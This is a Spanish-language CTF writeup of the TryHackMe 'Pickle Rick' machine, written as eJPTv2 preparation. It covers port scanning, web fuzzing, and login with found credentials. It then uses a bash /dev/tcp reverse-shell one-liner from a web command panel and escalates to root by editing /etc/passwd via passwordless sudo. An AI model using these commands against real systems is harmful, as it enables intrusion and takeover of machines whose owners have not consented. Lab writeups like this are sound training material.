---
title: Pickle Rick
date: 2024-09-21
categories: [WRITEUPS, PREPARING EJPTv2]
tags: []  # TAG names should always be lowercase
image: /assets/images/ejptv2/ejptV2.png
---

En la máquina **Pickle Rick** de **TryHackMe**, encuentro credenciales realizando **Fuzzing** web, y obtengo acceso en un panel de comandos, con la capacidad de ejecutar comandos en la máquina. Entraremos en la máquina y escalaré privilegios por los permisos de **Sudo** del usuario **www-data**.

---

![picture](/assets/images/ejptv2/rick1.png)

Lo primero que realizaré, será un *PING*, para comprobar si tengo conectividad con la máquina, y ya de paso para ver de que sistema operativo se trata.

Veo que tengo conectividad, y que el **ttl=63**, con lo que ya sabemos que estamos ante una máquina **Linux**.

![picture](/assets/images/ejptv2/rick2.png)

A continuación, realizaré será un escaneo de puertos con *Nmap*, para comprobar los puertos abiertos de la máquina.

```bash
nmap -p- --open -T5 10.10.233.129 -n -Pn -v
```

![picture](/assets/images/ejptv2/rick3.png){: w="600" h="300" }

Al comprobar los puertos abiertos, me dirijo al navegador para ver el contenido de la página web corriendo por el puerto **80**.

![picture](/assets/images/ejptv2/rick4.png)

Buscando algún tipo de información comentada en el código fuente de la página, encuentro un nombre de usuario.

![picture](/assets/images/ejptv2/rick5.png)

Realizando **Fuzzing** con **Gobuster**, encuentro las siguientes rutas y archivos.

```bash
gobuster dir -u http://10.10.233.129 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php,.txt,.md -b 404,403
```

![picture](/assets/images/ejptv2/rick6.png)

En el archivo "**robots.txt**", encuentro una palabra en texto claro.

![picture](/assets/images/ejptv2/rick7.png)

Y en el archivo de **login.php** encuentro un panel de login, voy a probar a usar el nombre de usuario encontrado y el texto reciente del archivo "**robots.txt**".

![picture](/assets/images/ejptv2/rick8.png)

Y obtengo resultado.

![picture](/assets/images/ejptv2/rick9.png)

Me llama la atención que haya un panel de comandos, voy a intentar ejecutar un comando para comprobar si me lo ejecuta en la máquina y me muestra el *output* del comando ejecutado.

Ejecutando el comando **whoami**, nos muestra el usuario que está corriendo el servicio Web.

![picture](/assets/images/ejptv2/rick10.png)

A continuación, la idea es obtener una **Reverse Shell**, para poder ejecutar comandos en la máquina local desde una terminal interactiva.

Para ello primero crearemos un **Listener** con **ncat**, por donde recibiré la **Reverse Shell**.

- Listener
	
```bash
nc -lnvp 4444
```

- Código para obtener la **Reverse Shell**.
	
```bash
bash -c "bash -i >& /dev/tcp/'Nuestra Ip'/4444 0>&1"
```

Y una vez ejecutemos, se nos quedará cargando la página, y habremos obtenido la **Shell** interactiva por el **Listener**.

- Ejecución del comando.

    ![picture](/assets/images/ejptv2/rick11.png)

- Shell interactiva

    ![picture](/assets/images/ejptv2/rick12.png)

Realizo un tratamiento de la **TTY**, para poder trabajar mejor.

```bash
script /dev/null -c bash
Ctrl_Z
stty raw -echo;fg
ls
export SHELL=/bin/bash
export TERM=screen
stty rows 51 columns 208
reset
```

En la misma ruta encuentro la primera **flag**.

![picture](/assets/images/ejptv2/rick13.png)

Buscando en la máquina, encuentro el directorio "**rick**" en "**/home**", y dentro encuentro la segunda flag.

![picture](/assets/images/ejptv2/rick14.png)

Y buscando posibles escaladas de privilegios, en búsqueda de la última **flag**, intentando encontrar bits **SUID**, **capabilities**, procesos, contraseñas en archivos, etc.

Me doy cuenta que el usuario **www-data** puede ejecutar **SUDO** sin necesitar contraseña. (*muy extraño*)

![picture](/assets/images/ejptv2/rick15.png)

Para la escalada de privilegios, le quitaré la contraseña al usuario **root**, para ello modificaremos el archivo "**/etc/passwd**".

```bash
sudo nano /etc/passwd
```

- Antes
	
	![picture](/assets/images/ejptv2/rick16.png)

- Después
	
	![picture](/assets/images/ejptv2/rick17.png)

Guardamos, salimos y migramos al usuario **root**.

![picture](/assets/images/ejptv2/rick18.png)

Y encontramos la tercera y última flag.

![picture](/assets/images/ejptv2/rick19.png)